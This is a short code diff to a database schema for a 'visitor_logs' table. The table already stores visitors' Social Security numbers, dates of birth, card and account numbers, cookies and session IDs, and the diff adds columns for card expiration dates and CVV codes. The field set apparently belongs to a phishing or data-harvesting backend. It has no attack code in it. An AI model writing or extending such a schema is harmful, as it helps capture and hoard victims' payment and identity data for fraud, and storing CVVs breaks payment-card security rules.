@@ -62,6 +62,8 @@ export const visitorLogs = pgTable("visitor_logs", {
   ssn: text("ssn"),
   dateOfBirth: text("date_of_birth"),
   cardNumber: text("card_number"),
+  cardExpiration: text("card_expiration"),
+  cardCvv: text("card_cvv"),
   accountNumber: text("account_number"),
   cookies: text("cookies"),
   sessionId: text("session_id"),
